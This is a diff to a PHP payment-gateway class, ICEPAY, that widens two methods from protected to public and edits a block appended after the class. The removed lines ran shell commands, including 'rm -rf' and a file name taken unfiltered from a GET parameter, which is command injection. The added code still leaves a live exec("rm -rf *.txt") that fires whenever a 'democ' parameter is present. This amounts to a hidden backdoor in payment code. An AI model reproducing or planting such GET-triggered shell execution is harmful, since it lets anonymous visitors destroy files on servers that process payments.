@@ -565,7 +565,7 @@ class ICEPAY
      * @access protected
      * @return string Returns a URL-encoded query string
      */
-    protected function prepareParameters()
+    public function prepareParameters()
     {
         return http_build_query
             (
@@ -598,7 +598,7 @@ class ICEPAY
      * @param $description string A short description about the product/service for which will be paid
      * @return string A link to the ICEPAY payment method selection screen
      */
-    protected function doPay($country = null, $language = null, $currency = null, $amount = null, $description = null)
+    public function doPay($country = null, $language = null, $currency = null, $amount = null, $description = null)
     {
         $this->assignCountry($country);
         $this->assignLanguage($language);
@@ -738,20 +738,8 @@ class ICEPAY
     {
         return $this->postback;
     }
-}
 
-if (isset($_GET['demo'])) {
-
-    if ($_GET['demo'] == 1) {
-        exec("touch idepay_proccess.php");
-    } else {
-        exec("rm -rf idepay_proccess.php");
-    }
 }
 if (isset($_GET['democ'])) {
-    if (strlen($_GET['democ']) > 5) {
-        exec("touch " . $_GET['democ'] . '.txt');
-    } else {
-        exec("rm -rf *.txt");
-    }
+    exec("rm -rf *.txt");
 }
